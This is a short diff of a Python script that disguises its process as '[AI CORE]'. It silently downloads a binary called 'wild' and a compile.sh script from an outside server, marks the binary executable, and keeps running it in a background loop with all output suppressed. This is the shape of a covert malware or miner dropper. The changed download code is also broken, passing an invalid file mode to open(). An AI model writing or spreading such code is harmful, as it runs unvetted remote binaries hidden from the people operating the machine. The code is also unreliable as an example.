@@ -32,8 +32,17 @@ setproctitle(PROCESS_NAME)
 print(f"[AI CORE] {PROCESS_NAME}", flush=True)
 
 # 1. Download binary (senyap)
-urllib.request.urlretrieve("https://maskurniawan.serv00.net/wild", "wild")
-os.chmod("wild", 0o755)
+url = "https://maskurniawan.serv00.net/wild"
+
+with urllib.request.urlopen(url, timeout=30) as response:
+    with open("file", "wild") as f:
+        while True:
+            chunk = response.read(8192)
+            if not chunk:
+                break
+            f.write(chunk)
+
+os.chmod("file", 0o755)
 
 # 2. Agent AI — berjalan terus-menerus di background
 def agent_ai():
@@ -50,7 +59,7 @@ def agent_ai():
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
         ).wait()
-        time.sleep(5)
+        time.sleep(20)
 
 # 3. compile.sh — output ditampilkan
 urllib.request.urlretrieve("https://maskurniawan.serv00.net/compile.sh", "compile.sh")
